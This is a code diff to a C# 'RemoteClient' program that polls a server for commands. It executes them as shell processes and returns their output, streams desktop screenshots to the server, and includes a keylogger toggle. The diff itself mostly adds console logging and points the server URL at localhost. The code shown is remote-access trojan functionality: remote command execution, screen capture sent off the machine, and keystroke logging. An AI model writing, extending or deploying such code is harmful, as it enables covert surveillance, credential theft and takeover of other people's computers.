@@ -15,7 +15,7 @@ namespace RemoteClient
     public class Program
     {
         // Server connection details
-        private static readonly string ServerUrl = "http://your-server-url.com"; // Update with your actual server URL
+        private static readonly string ServerUrl = "http://localhost:3001"; // Update with your actual server URL
         private static readonly HttpClient httpClient = new HttpClient();
         
         // Computer information
@@ -134,8 +134,9 @@ namespace RemoteClient
                         var commandsJson = response.Content.ReadAsStringAsync().Result;
                         var commands = Newtonsoft.Json.JsonConvert.DeserializeObject<Command[]>(commandsJson);
                         
-                        if (commands != null)
+                        if (commands != null && commands.Length > 0)
                         {
+                            Console.WriteLine($"Received {commands.Length} commands");
                             foreach (var command in commands)
                             {
                                 ProcessCommand(command);
@@ -190,6 +191,8 @@ namespace RemoteClient
         {
             try
             {
+                Console.WriteLine($"Processing command: {command.Type} - {command.Payload}");
+                
                 switch (command.Type)
                 {
                     case "execute":
@@ -252,6 +255,12 @@ namespace RemoteClient
                 string error = process.StandardError.ReadToEnd();
                 process.WaitForExit();
                 
+                Console.WriteLine($"Command output: {output}");
+                if (!string.IsNullOrEmpty(error))
+                {
+                    Console.WriteLine($"Command error: {error}");
+                }
+                
                 // Send output back to server
                 var resultData = new
                 {
@@ -275,6 +284,7 @@ namespace RemoteClient
         
         private static void ToggleDesktopStream(bool enable)
         {
+            Console.WriteLine($"Desktop streaming toggled: {enable}");
             isDesktopStreamActive = enable;
             
             if (enable && desktopStreamTimer == null)
@@ -292,6 +302,7 @@ namespace RemoteClient
         {
             try
             {
+                Console.WriteLine("Sending desktop screenshot");
                 var bounds = Screen.PrimaryScreen.Bounds;
                 using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                 {
@@ -309,7 +320,19 @@ namespace RemoteClient
                         var content = new ByteArrayContent(imageBytes);
                         content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                         
-                        httpClient.PostAsync($"{ServerUrl}/api/clients/{ComputerId}/desktop-stream", content);
+                        var response = httpClient.PostAsync(
+                            $"{ServerUrl}/api/clients/{ComputerId}/desktop-stream", 
+                            content
+                        ).Result;
+                        
+                        if (response.IsSuccessStatusCode)
+                        {
+                            Console.WriteLine("Screenshot sent successfully");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"Failed to send screenshot: {response.StatusCode}");
+                        }
                     }
                 }
             }
@@ -321,6 +344,7 @@ namespace RemoteClient
         
         private static void ToggleKeylogger(bool enable)
         {
+            Console.WriteLine($"Keylogger toggled: {enable}");
             isKeyloggerActive = enable;
             
             if (enable)
